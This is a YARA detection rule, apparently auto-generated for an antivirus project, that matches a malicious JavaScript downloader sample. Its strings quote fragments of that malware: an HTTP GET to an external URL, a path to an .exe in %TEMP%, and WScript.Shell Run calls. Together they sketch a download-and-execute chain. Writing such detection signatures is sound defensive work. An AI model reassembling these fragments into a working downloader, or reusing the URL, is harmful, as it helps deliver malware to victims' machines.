rule sig_20160329_19c99dce5d23a6e25d30e3d82d1172e3 {
  meta:
    description = "datamaliciousorder - file 20160329_19c99dce5d23a6e25d30e3d82d1172e3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1fd0f401cc4c46ff6f305215e1799b4682cf0384e17cda38e56682bb2d912ef2"

  strings:
    $s1  = "G0[RN](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function eE() {return e0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DjdEMU3W8d.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[fk](I() * 11); if (G0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function DH(A, AN){b = b * 1; return A - AN;};" fullword ascii
    $s5  = "var e0 = function Vr() {return WScript[v](\"WScript.Shell\");}(), Q = 11;" fullword ascii
    $s6  = "function rp(){return \"\" + X0;};" fullword ascii
    $s7  = "function T(Jo){e0[\"Run\"](Jo, b, b);};" fullword ascii
    $s8  = "function n() {return ((c == true) && (c == a)) ? 1 : b;};" fullword ascii
    $s9  = "function I(){return 22;};" fullword ascii
    $s10 = "return DH(l, Ti);" fullword ascii
    $s11 = "var bE = new this[\"Date\"]();" fullword ascii
    $s12 = " while (z){" fullword ascii
    $s13 = "function O(es) {var M = (1, 2, 3, 4, 5, es); return M;};" fullword ascii
    $s14 = "function u()" fullword ascii
    $s15 = "function e(){return v;};" fullword ascii
    $s16 = "var a = false;" fullword ascii
    $s17 = "a = true; " fullword ascii
    $s18 = "var c = false;" fullword ascii
    $s19 = "c = true; " fullword ascii
    $s20 = "} catch(CN){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}